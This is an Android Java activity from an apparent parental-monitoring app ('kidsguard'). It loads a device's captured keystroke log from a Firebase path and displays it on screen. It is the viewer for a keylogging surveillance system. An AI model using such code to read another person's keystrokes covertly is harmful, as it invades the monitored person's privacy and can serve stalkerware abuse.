package com.kidsguard.parent;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

import org.json.JSONObject;

public class KeylogsActivity extends Activity {

    String deviceCode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceCode = getIntent().getStringExtra("device_code");

        final TextView tv = new TextView(this);
        tv.setTextSize(13);
        tv.setPadding(30, 30, 30, 30);
        tv.setText("Loading keylogs...");
        setContentView(tv);

        setTitle("Keylogs");

        new Thread(() -> {
            String json = FirebaseHelper.get("devices/" + deviceCode + "/keylog.json");
            if (json != null && !json.equals("null")) {
                try {
                    JSONObject obj = new JSONObject(json);
                    final String keys = obj.optString("keys", "");
                    runOnUiThread(() -> tv.setText(keys.replace(" | ", "\n")));
                } catch (Exception e) {}
            } else {
                runOnUiThread(() -> tv.setText("No keylogs yet"));
            }
        }).start();
    }
}
